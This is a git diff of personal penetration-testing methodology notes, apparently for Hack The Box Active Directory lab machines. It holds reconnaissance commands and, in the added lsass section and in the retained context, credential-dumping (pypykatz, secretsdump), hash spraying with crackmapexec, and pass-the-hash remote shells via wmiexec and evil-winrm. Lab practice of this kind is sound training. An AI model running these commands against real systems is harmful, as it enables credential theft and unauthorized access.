@@ -1,16 +1,24 @@
 # Methodology
-1. `./rustscan -a 10.129.95.185 -r 1-65535` get portscan information.
-2. `nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.161`.
-3. Helpful to get ports from rustscan output saved to a file, only ports btw `cat notes.txt | awk '{print $2}' | cut -d':' -f2 | paste -sd ","`.
-4. `nmap -sC -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -oA scans/nmap-tcpscripts 10.10.10.161`.
-5. `dig  @10.10.10.161 htb.local`, `htb.local` is the domain name we got from scanning.
-6. `dig  @10.10.10.161 forest.htb.local`
-7. `dig axfr  @10.10.10.161 htb.local` try zone traansfer.
-8. `ldapsearch -x -b "dc=htb,dc=local" -H ldap://10.10.10.161`, -x to check for anonymous login.
-9. `smbmap -H 10.10.10.161` try to share without password.
-10. `smbmap -H 10.10.10.161 -u 0xdf -p 0xdf`.
-11. `smbclient -N -L //10.10.10.161`.
-12. SMB one liner to download everythig recursively.
+1. Initial scanning
+```diff
+@@ ./rustscan -a 10.129.95.185 -r 1-65535 @@ get portscan information.
+@@ nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.161 @@
+Helpful to get ports from rustscan output saved to a file, only ports btw 
+@@ cat notes.txt | awk '{print $2}' | cut -d':' -f2 | paste -sd "," @@
+@@ nmap -sC -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -oA scans/nmap-tcpscripts 10.10.10.161 @@
+```
+2. DNS
+ - Check for dns transfer
+```diff
+@@ dig  @10.10.10.161 htb.local @@ htb.local being the domain name we got earlier
+@@ dig  @10.10.10.161 forest.htb.local @@
+@@ dig axfr  @10.10.10.161 htb.local @@
+```
+9. `ldapsearch -x -b "dc=htb,dc=local" -H ldap://10.10.10.161`, -x to check for anonymous login.
+10. `smbmap -H 10.10.10.161` try to share without password.
+11. `smbmap -H 10.10.10.161 -u 0xdf -p 0xdf`.
+12. `smbclient -N -L //10.10.10.161`.
+13. SMB one liner to download everythig recursively.
 ```diff
 @@ smbclient //10.10.10.192/profiles$ -N -c "prompt OFF;recurse ON; lcd; mget *" @@
 + If u have username
@@ -67,6 +75,25 @@
 43. `impacket-wmiexec -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 htb.local/administrator@10.10.10.161` use the hash, usernae and ip to get remote shell.
 44. Another way or privilige escalatoin `https://github.com/carlospolop/PEASS-ng/blob/master/winPEAS/winPEASexe/README.md`.
 45. If u have user who can see NTUSER.dat, `impacket-secretsdump egotistical-bank.local/svc_loanmgr:'Moneymakestheworldgoround!'@10.10.10.175` to get password hashes.
+46. If u get a lsass dump
+ - Use pyykatz to get the info ad dump hashes
+```diff
+@@ pip3 install pypykatz @@
+@@ pypykatz lsa minidump lsass.DMP @@
+```
+ - Get the users and hashes
+```diff
+@@ pypykatz lsa minidump lsass.DMP | grep 'NT:' | awk '{ print $2 }' | sort -u > hashes @@
+@@ pypykatz lsa minidump lsass.DMP | grep 'Username:' | awk '{ print $2 }' | sort -u > users @@
+```
+ - Try spraying the password
+```diff
+@@ crackmapexec smb 10.10.10.192 -u users -H hashes @@
+```
+ - If success, try winrm after that
+```diff
+@@ evil-winrm -i 10.10.10.192 -u <user_matched> -H <hash_matched> @@
+```
 # Initial Attack Vector
 ### LLMNR Poisoning
  - Link Local Multicast Name Resolution.
